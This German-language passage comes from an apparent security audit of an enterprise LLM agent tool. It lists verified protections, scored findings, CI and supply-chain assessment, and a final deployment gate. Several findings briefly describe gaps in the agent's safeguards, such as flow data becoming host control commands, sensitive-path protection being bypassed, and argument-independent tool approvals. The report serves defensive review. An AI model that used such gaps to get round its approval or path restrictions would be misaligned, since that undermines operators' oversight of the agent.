Das ist **nicht automatisch eine neue Vulnerability**: Die Freigaben gelten bewusst toolweit und argumentunabhängig. Es zeigt aber, dass Host-Allowlisting und Tool-Contract-Pinning keine DLP- oder Zweckbindung ersetzen.

Diese Ketten erhalten keine zusätzlichen Punktabzüge.

---

## 7. Positiv verifizierte Sicherheitsmechanismen

### Admin- und Netzwerkgrenzen

- Die produktiven CLI-Pfade laden die Admin-Policy ohne benutzerwählbaren Override.
- Ohne Policy gelten ausschließlich lokale Modell-/MCP-Hosts und kein Webzugriff.
- `[network]` in der Userconfig wird abgewiesen.
- Externe HTTP-Ziele benötigen HTTPS.
- URL-Credentials werden zurückgewiesen.
- Die direkten HTTP-Clients nutzen `trust_env=False`.
- Remote-Modell-Credentialquellen werden an Provider und Host gebunden.

### Tools und Prozesse

- Externe stdio-Server werden aus Adminprofilen materialisiert, nicht aus User-Launchparametern.
- Toolargumente werden **vor Approval und Ausführung** validiert.
- Ohne Approval-Callback beziehungsweise ohne TTY wird nicht still genehmigt.
- Permanente externe Auto-Approvals prüfen Serveridentität und Tool-Contract.
- Built-in-Schreiboperationen werden nicht durch externe Admin-Auto-Approvals freigeschaltet.
- Gleichzeitige exponierte Toolnamenskollisionen führen zum Fehler.

### Untrusted Content

- Referenzdaten stehen getrennt vor dem unveränderten aktuellen Prompt.
- Diese synthetische Message wird nicht in `history` übernommen.
- OKF-Auswahl-Tokens binden die finale Auswahl an tatsächlich gelesene Concepts.
- Der Knowledge-Lauf besitzt getrennte Routen und nur die vorgesehenen Tools.

### Ressourcen und Bedienoberfläche

- Schema-Prüfung läuft in einem wiederverwendbaren, ersetzbaren Prozess.
- Pipe-Übertragung und Lock-Wartezeit sind in die Requestdeadline einbezogen.
- RE2 reduziert Regex-Komplexitätsangriffe.
- Approval-Anzeigen neutralisieren Steuerzeichen und machen sensitive Payloads nicht anhand fremdkontrollierter Feldnamen unsichtbar.
- PDF-Worker erhalten eine reduzierte Umgebung und können bei Timeout beendet werden.

---

## 8. Zusätzliche projektspezifische Aspekte

### 8.1 OKF-Navigation funktioniert für synthetisierte Indizes nicht vollständig

`knowledge_index()` liefert bei synthetisierten Indizes `entries`, aber leere `internal_links`.

`_knowledge_allowed_calls()` wertet ausschließlich `internal_links` aus. Dadurch werden angebotene synthetisierte Einträge nicht als zulässige Folgeaufrufe registriert.

**Folge:** Eine laut Toolbeschreibung unterstützte Navigation kann im Agenten scheitern. Das ist ein funktionaler Integrationsfehler, kein zusätzlicher Sicherheitsabzug.

### 8.2 „Run-Start-Snapshot“ ist kein atomarer Dateisystem-Snapshot

Flow-Dateien werden sequenziell gelesen und später anhand von Fingerprints geprüft. Das schützt gegen viele nachträgliche Änderungen, bildet aber keinen gemeinsamen atomaren Zeitpunkt aller Dateien ab.

Außerdem beweist ein gültiger JSON-Checkpoint weder fachliche Richtigkeit noch die Übereinstimmung mit aktuellem Prompt, Modell oder Config. Manuell editierbare Checkpoints sind ausdrücklich vorgesehen.

**Betriebliche Konsequenz:** Checkpoints dürfen nicht ungeprüft als Sicherheitsfreigabe oder Compliance-Nachweis interpretiert werden.

### 8.3 Context-Limit und Usage sind keine Kosten- oder Laufzeitbudgets

- Ollama sendet fest `num_ctx = ctx_large`; `context_length` steuert nicht diesen Requestwert.
- Der Context-Guard arbeitet mit gemeldeter Usage, nicht mit einer garantierten Vorabschätzung.
- Conversation-Turns setzen die letzte Usage zurück; die abschließend ausgegebene Usage bildet nicht automatisch die gesamte Conversation ab.
- Es gibt kein Flow-weites Kosten-/Tokenbudget.

Das ist keine administrative Policy-Umgehung, sollte aber für lange automatisierte Flows berücksichtigt werden.

### 8.4 Diagnosemetadaten können absolute Pfade enthalten

Der Systemprompt enthält keinen absoluten Workspace. Daraus folgt jedoch nicht, dass niemals ein absoluter Pfad zum Modell gelangt: Dateisystemausnahmen und Fehlerstrings können solche Pfade enthalten.

Die Dokumentationsaussage sollte auf den tatsächlich abgesicherten Kanal begrenzt werden.

### 8.5 Architekturkomplexität

Die gemeinsame Execution-Schicht ist eine gute Entscheidung. Gleichzeitig erhöhen:

- eng gekoppelte Mixins,
- dynamische Zustandsattribute,
- doppelte Validierungsimplementierungen und
- das sehr große `flow.py`

den Review- und Wartungsaufwand. Explizite Komponentenverträge und eine Aufteilung der Flow-Engine wären sinnvoll, ohne dass daraus allein ein Vulnerability-Finding entsteht.

---

## 9. Unternehmensbetrieb

### Technische Voraussetzungen

- Agent und Dependencies aus einem überprüften, isolierten Paket betreiben.
- Installation möglichst außerhalb modellbeschreibbarer Workspaces.
- Keine ungeprüften MCP-Erweiterungen als Teil einer allgemeinen Core-Freigabe behandeln.
- Für sensible Aufgaben zunächst minimale Capabilities verwenden.
- Lange Flows mit externem Laufzeit-/Kostenmonitoring betreiben.

### Administrative Voraussetzungen

- Modell-, MCP- und Webhosts minimal freigeben.
- stdio-Profile einschließlich Argumenten und ausführbaren Dateien prüfen.
- `trust_instructions=true` als Ausnahme behandeln.
- Auto-Approvals nur für tatsächlich geprüfte Tools und Contracts vergeben.
- Secret-Variablen bewusst benennen und deren Bereitstellung dokumentieren.

### Organisatorische Voraussetzungen

- Datenklassen definieren, die an das interne Modell gelangen dürfen.
- Retention, Telemetrie und Training beim Modellbetreiber klären.
- OKF-Repositories als zusätzliche Datenquellen freigeben.
- Toolweite Session-/CLI-Freigaben als argumentunabhängige Freigabe erläutern.
- Logs und Dumps in Support-/Backup-Prozessen berücksichtigen.
- Versionen, Policyänderungen, Verantwortliche und Rücknahmeverfahren dokumentieren.

**Nicht erforderlich für das primäre Threat Model:** eine technische Totalblockade gegen bewusst regelverletzende lokale Administratoren.

---

## 10. Test- und CI-Bewertung

Die sichtbaren Tests sind substanziell. Sie prüfen nicht nur Happy Paths, sondern unter anderem:

- Admin-/User-Trennung;
- fehlende und unzulässige Credentials;
- Contract-Drift;
- ungültige und unbekannte Toolaufrufe;
- Hardlinks, Symlink-Escapes und geschützte Dateien;
- MCP-Timeouts und Cleanup;
- JSON-Reparatur mit gemeinsamem Toolbudget;
- Worker-Neustart nach komplexer Schema-Prüfung;
- Flow-Kollisionen und Checkpoint-Manipulation;
- reale lokale Webredirects.

### Tatsächliche Matrix

Die CI testet:

- Python **3.11** auf Windows und Ubuntu;
- bei Pull Requests zusätzlich **3.12, 3.13 und 3.14** auf beiden Betriebssystemen.

Damit werden alle im Projekt ausdrücklich unterstützten Python-Minors erfasst. Die Dokumentation beschreibt diese Matrix teilweise unvollständig.

Linux ARM64 wird als Ziel genannt, aber nicht direkt getestet. Nach der vorgegebenen Scoringregel ist das **keine zusätzliche ungetestete Plattformfamilie**, weil Linux getestet wird. Architekturabhängige Wheel- und Laufzeitprüfung bleibt sinnvoll.

### Grenzen der Evidenz

- Kein Testlauf wurde hier ausgeführt.
- CI-Ergebnisse eines konkreten Runs liegen nicht vor.
- Viele MCP-Lifecycle-Tests arbeiten mit Fakes; reale AnyIO-/SDK-Lifecycle-Semantik ist damit nur teilweise abgedeckt.
- Windows-spezifische Alias-/Streamtests fehlen im sichtbaren Bestand.

Fehlende Regressionstests zu bereits bewerteten Findings werden nicht nochmals bepunktet.

---

## 11. Dependency- und Supply-Chain-Bewertung

### Stärken

- `uv lock --check` vor Tests und Build;
- `uv sync --frozen`;
- exakt gepinntes Build-Backend;
- Wheel-Installationsprüfung;
- CycloneDX-SBOM aus einer Runtime-Referenzumgebung;
- SHA-256-Checksums;
- Publishing nur manuell, auf `main`, nach Package-Job;
- separates Publishing-Environment;
- keine erkennbaren statischen CI-Secrets im Snapshot.

### Einschränkungen

1. **`uv.lock` ist im bereitgestellten Material nicht vorhanden.**  
   Exakte Auflösung, Paketquellen und Hashes können nicht beurteilt werden.

2. `jsonschema` wird direkt importiert, ist aber nicht als direkte Projektabhängigkeit deklariert.  
   Die Anwendung hängt damit für eine zentrale Funktion von einer transitiven Dependency ab.

3. Der Schema-Code greift auf private Resolverdetails von `jsonschema` zu.  
   Das erhöht den Bedarf an gezielten Upgrade- und Kompatibilitätstests.

4. SBOM und Buildumgebung sind nicht automatisch identisch mit einer späteren `pipx`-/Indexinstallation, die Dependencies neu auflöst.  
   Die Enterprise-Dokumentation erkennt diese Unterscheidung zutreffend.

5. Automatisierte SCA, Signierung/Attestation und unveränderliche Action-Pins fehlen.

6. Der Package-Job hängt nur von `test`, nicht von `compatibility-test`, ab.  
   PR-Artefakte können deshalb entstehen, obwohl eine zusätzliche Minor-Version fehlschlägt. Sie sind nicht automatisch Releases.

**Keine Aussage:** „Dependencies sind frei von bekannten Schwachstellen.“ Dafür fehlen Lockfile und ausgeführter Scan.

---

## 12. Offene Fragen und Evidenzlücken

Vor einer breiten Freigabe sollten geklärt werden:

1. Welche genaue MCP-/jsonschema-Version wird tatsächlich verteilt?
2. Welche Output-Schema-Verarbeitung führt das SDK aus?
3. Sind alle SDK-internen Netzwerkpfade frei von automatischer Referenzauflösung?
4. Wie verhalten sich NTFS-Streams und weitere Windows-Aliase mit den unterstützten Python-Versionen?
5. Welche Peak-Speicherlast verursachen adversarial MCP-, HTTP- und PDF-Eingaben?
6. Funktionieren Deaktivieren, Wiederverbinden und Fehler-Cleanup mit realen MCP-Transporten zuverlässig?
7. Entspricht das konkrete Unternehmenspaket tatsächlich dem getesteten Dependency-Stand?

Die zentralen first-party Host-, Routing- und Approval-Implementierungen sind einsehbar. Es wird daher kein pauschaler Unknown-Abzug auf ganze Bereiche angewandt. Die konkrete SDK-Ungewissheit ist als F-04 erfasst und wird nicht zusätzlich doppelt bepunktet.

---

## 13. Priorisierte Maßnahmen

### Vor Freigabe der jeweils betroffenen Betriebsmodi

1. **F-01 beheben**, bevor modellparametrisierte One-Shot-Flows breit eingesetzt werden.
2. **F-02 beheben**, bevor auf das Ausblenden sensibler Verzeichnisse vertraut wird.
3. **F-04 verifizieren**, bevor neue externe MCPs breit oder dauerhaft automatisch freigegeben werden.
4. Verteilten Dependency-Stand einschließlich SCA prüfen.

Es gibt nach der vorgegebenen Gate-Logik **keinen bestätigten Critical-/High-Blocker**.

### Vor breiter Einführung empfohlen

- F-06: frühe Ressourcenbegrenzung lokaler Verarbeitung;
- F-07: datensparsame Fehlerlogs;
- Windows-Tests zu F-08;
- reale MCP-Lifecycle-Integrationstests;
- vorhandene Dokumentationswidersprüche bereinigen;
- reproduzierbares Unternehmenspaket und getesteten Rollback bereitstellen.

### Weiteres Hardening

- Race-resistente Datei-I/O;
- eindeutige strukturierte Toolidentitäten;
- strengere Konfigurationsvalidierung;
- Parser-Ressourcenmessung beziehungsweise OS-Limits;
- Flow-weite Budgets und bessere Usage-Aggregation;
- SCA, Provenance und SHA-gepinnte CI-Actions.

---

## 14. Pflichtprüfungs-Coverage und Score Traceability

### 14.1 Pflichtprüfungs-Coverage

„Geprüft und unauffällig“ bedeutet hier statisch unauffällig innerhalb des beschriebenen Scopes, nicht praktisch vollständig nachgewiesen.

| Nr. | Angriffsklasse | Status | Ergebnis |
|---:|---|---|---|
| 1 | Konfigurations-/Policy-Bypässe | **Finding vorhanden** | F-01, F-10; direkte Admin-/Hosttrennung wirksam |
| 2 | lokale Datenquellen | **Finding vorhanden** | F-02/F-03/F-08; OKF-Root-Auswahl legitim |
| 3 | Datenminimierung | **Finding vorhanden** | F-07; Erfolgs-URL-Redaktion positiv |
| 4 | Protokoll-/Parserressourcen | **Finding vorhanden** | F-05/F-06 |
| 5 | menschliche Freigabeoberfläche | **Finding vorhanden** | F-09; Terminal-/Approval-Sanitizing ansonsten stark |
| 6 | strukturierte Datenkomplexität | **Finding vorhanden** | Input-Worker stark; Output-SDK-Pfad F-04 offen |
| 7 | direkte Host-Datei-I/O | **Finding vorhanden** | F-03/F-08; explizite Inputs ansonsten gut geprüft |
| 8 | Races/Aliasing/Plattformsemantik | **Finding vorhanden** | F-03/F-08, praktische Verifikation ausstehend |
| 9 | Prozessstart/Kindprozess-Kontext | **geprüft und unauffällig** | eigene Launchbildung ohne Shell, adminprofilgebunden |
| 10 | Build/Release/Distribution | **Finding vorhanden** | feste Reifeabzüge für SCA, Provenance, Action-Pins |
| 11 | Runtime-/Plattformmatrix | **geprüft und unauffällig** | alle zugesagten Minors; ARM64 nicht separat getestet |
| 12 | Netzwerkidentität/SSRF | **Finding vorhanden** | direkte Pfade unauffällig; F-04 als möglicher Nebenpfad |
| 13 | Logging/Diagnose | **Finding vorhanden** | F-07 |
| 14 | Cross-Capability-Ketten | **Finding vorhanden** | insbesondere F-01 und F-02 |

**DNS-Bewertung:** Bei nichtlokalen erlaubten Hosts sichert HTTPS zusätzlich die Serveridentität ab. Das Fehlen einer separaten IP-Allowlist ist deshalb nicht automatisch ein Finding. Die lokale HTTP-Ausnahme setzt eine vertrauenswürdige lokale Namensauflösung und lokale Dienste voraus; ein tatsächlich erfolgreicher DNS-/URL-Parser-Bypass wurde nicht nachgewiesen.

### 14.2 Score Traceability

Abkürzungen:

- **SB:** Technische Security Boundaries
- **LM:** LLM/MCP/Prompt Injection
- **NK:** Netzwerk/Policy/Config
- **TR:** Tests/Regression
- **ES:** Enterprise/Supply Chain

| Finding / Abzug | Kategorie | Severity | Bereich | Abzug | Begründung |
|---|---|---|---|---:|---|
| F-01 | Confirmed Vulnerability | Medium | SB | −8 | Flow-Daten werden Host-Steuerung |
| F-02 | Confirmed Vulnerability | Medium | SB | −8 | direkte Nachkommenzugriffe umgehen Sensitivitätsklassifikation |
| F-03 | Plausible Risk | Medium | SB | −4 | konkurrierender Pfadaustausch |
| F-04 | Plausible Risk | High | LM | −10 | möglicher zusätzlicher SDK-Validierungs-/Netzwerkpfad |
| F-05 | Plausible Risk | Medium | LM | −4 | Ressourcenverbrauch vor wirksamen Limits |
| F-06 | Confirmed Vulnerability | Medium | LM | −8 | unbeschränkte lokale Materialisierung |
| F-07 | Confirmed Vulnerability | Low | ES | −3 | Nutzdaten in Default-Fehlerdiagnosen |
| F-08 | Plausible Risk | Medium | SB | −4 | Windows-Stream-/Alias-Schutz offen |
| F-09 | Hardening Recommendation | Low | SB | −1 | mehrdeutiger flacher Toolnamensraum |
| F-10 | Hardening Recommendation | Low | NK | −1 | stille Config-Fallbacks und tolerante Validierung |
| Zusatz: keine Signierung/Attestation/Provenance | feste Zusatzregel | — | ES | −2 | im Workflow nicht implementiert |
| Zusatz: keine automatisierte SCA | feste Zusatzregel | — | ES | −2 | im Workflow nicht implementiert |
| Zusatz: mutable Major-Tags | feste Zusatzregel | — | ES | −1 | Actions nicht per Commit-SHA gepinnt |

**Zusätzlicher ES-Abzug: 5 Punkte**, damit unter dem Maximum von 12.

### Nicht angewandte Zusatzabzüge

- **Kein Testausführungsabzug:** CI ist nachvollziehbar vorhanden; Nichtausführung reduziert die Confidence.
- **Kein Python-Matrixabzug:** 3.11–3.14 werden getestet.
- **Kein Plattformfamilienabzug:** Windows und Linux sind vertreten.
- **Kein pauschaler Negativtestabzug:** Zentrale implementierte Grenzen besitzen sinnvolle Negativtests; Tests zu bestehenden Findings werden nicht doppelt gezählt.
- **Kein Abzug wegen fehlender SBOM/Checksums:** Pipeline erzeugt beides.
- **Kein Abzug „kein definierter Release-/Rollbackpfad“:** Ein versionierter Zielprozess ist dokumentiert, auch wenn noch nicht vollständig automatisiert.
- **Kein pauschaler Installationsabzug:** Der dokumentierte Enterprise-Zielweg verlangt gerade eine geprüfte feste Auflösung. Der Entwickler-`pipx`-Weg wird davon getrennt.
- **Kein Abzug für benutzergewählte OKF-Roots oder bewusst administrativ änderbare Policy.**

### 14.3 Teilbewertungen

| Bereich | Rechnung | Score |
|---|---|---:|
| Technische Security Boundaries | 100 − 8 − 8 − 4 − 4 − 1 | **75** |
| LLM/MCP/Prompt Injection | 100 − 10 − 4 − 8 | **78** |
| Netzwerk/Policy/Config | 100 − 1 | **99** |
| Tests/Regression | 100 − 0 | **100** |
| Enterprise/Supply Chain | 100 − 3 − 2 − 2 − 1 | **92** |

Der Testscore von 100 bedeutet ausschließlich: **keine zusätzlichen Abzüge nach der vorgegebenen Matrix**. Er bedeutet weder vollständige Testabdeckung noch praktisch nachgewiesene Fehlerfreiheit.

### 14.4 Konsistenzcheck

- Jedes Finding zählt genau einmal.
- Angriffsketten erzeugen keine weiteren Abzüge.
- Die dokumentierten Restrisiken werden nicht zusätzlich als Dokumentationsfindings gezählt.
- Starke Schema-, Netzwerk- und Approval-Prüfungen erhalten keine Bonuspunkte, werden aber auch nicht wegen unverbundener Schwächen abgewertet.
- Das SDK-Risiko bleibt unbestätigt und erhält keinen bestätigten High-Abzug.
- Gate und Score werden getrennt berechnet.

---

## 15. Gesamturteil

- **Kategorie: D – Für den vorgesehenen pragmatischen Unternehmenseinsatz gut abgesichert**
- **Security Quality Score / Gesamtscore: 87/100**
- **Deployment Gate: `OPEN_WITH_FINDINGS`**
- **Score-Confidence: Medium**

### Gewichtete Berechnung

```text
75 × 0,30 = 22,50
78 × 0,20 = 15,60
99 × 0,20 = 19,80
100 × 0,15 = 15,00
92 × 0,15 = 13,80
-----------------
Summe       86,70
Gerundet    87/100
```

### Begründung des Gates

Es bestehen keine bestätigten relevanten Critical-/High-Findings. Die bestätigten Medium-Findings **F-01, F-02 und F-06**, das Low-Finding **F-07** sowie die offenen Verifikations- und Hardeningpunkte begründen `OPEN_WITH_FINDINGS`.

F-04 ist potenziell freigaberelevant, aber **nicht bestätigt** und deshalb nach der vorgegebenen Logik kein High-Gate-Blocker.

### Wichtigste begrenzende Faktoren

- Übergang von Flow-Daten zu Host-Steuerbefehlen;
- inkonsistenter rekursiver Sensitive-Path-Schutz;
- unbeschränkte lokale Verarbeitung;
- nicht abschließend geprüfte SDK-Outputverarbeitung;
- pfadbasierte Race-Fenster und Windows-Aliasing;
- fehlende automatisierte SCA und Artefakt-Provenance.

### Wichtigste tragende Faktoren

- belastbare Admin-/User-Konfigurationstrennung;
- restriktive Netzwerk- und Prozessdefaults;
- gute Approval- und Contract-Prüfungen;
- isolierte, begrenzte Input-Schema-Validierung;
- breite Security-Negativtests;
- realistische Dokumentation wesentlicher Trust Boundaries;
- keine unnötige Docker-/Codeexecution-Fläche im Core.

**Fazit:** Kein bloß durch Prompts abgesicherter Agent, sondern ein ernsthaft gehärtetes Werkzeug mit überwiegend deterministischen Grenzen. Für den kontrollierten Unternehmenseinsatz geeignet; die konkret benannten Flow-, Dateisystem- und SDK-Punkte sollten vor breiter Automatisierung gezielt geschlossen beziehungsweise verifiziert werden.